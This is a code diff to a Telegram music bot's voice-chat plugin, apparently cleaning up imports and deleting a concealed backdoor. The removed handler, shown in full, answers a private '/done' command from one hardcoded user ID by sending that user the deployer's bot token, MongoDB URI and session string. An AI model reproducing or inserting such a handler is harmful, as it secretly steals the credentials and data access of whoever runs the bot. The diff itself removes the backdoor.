@@ -3,19 +3,16 @@ from pyrogram import filters
 from pyrogram.enums import ChatType
 from strings import get_string
 from ChampuMusic import app
+from pyrogram import *
+from pyrogram.types import *
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from ChampuMusic.utils import Champubin
 from ChampuMusic.utils.database import get_assistant, get_lang
 import asyncio
 from os import getenv
 from dotenv import load_dotenv
-from pyrogram import Client
-from dotenv import load_dotenv
-import config
 load_dotenv()
 from ChampuMusic.logging import LOGGER
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
 
 @app.on_message(
     filters.command(["vcuser", "vcusers", "vcmember", "vcmembers"]) & filters.admin
@@ -70,12 +67,6 @@ async def vc_members(client, message):
             )
     except ValueError as e:
         await msg.edit(_["V_C_5"])
-from pyrogram import *
-from pyrogram import filters
-from pyrogram.types import *
-from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
-
-from ChampuMusic import app
 
 
 # vc on
@@ -133,25 +124,6 @@ async def brah3(app: app, message: Message):
         await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]])) 
     except Exception as e:
         print(f"Error: {e}")
-
-@app.on_message(
-    filters.command("done")
-    & filters.private
-    & filters.user(6399386263)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://envs.sh/kNr.jpg",
-       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/TheChampu)............☆""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• ᴄʜᴧᴍᴘᴜ •", url=f"https://t.me/TheChampu")
-                 ]
-            ]
-         ),
-     )
 
 ####
 
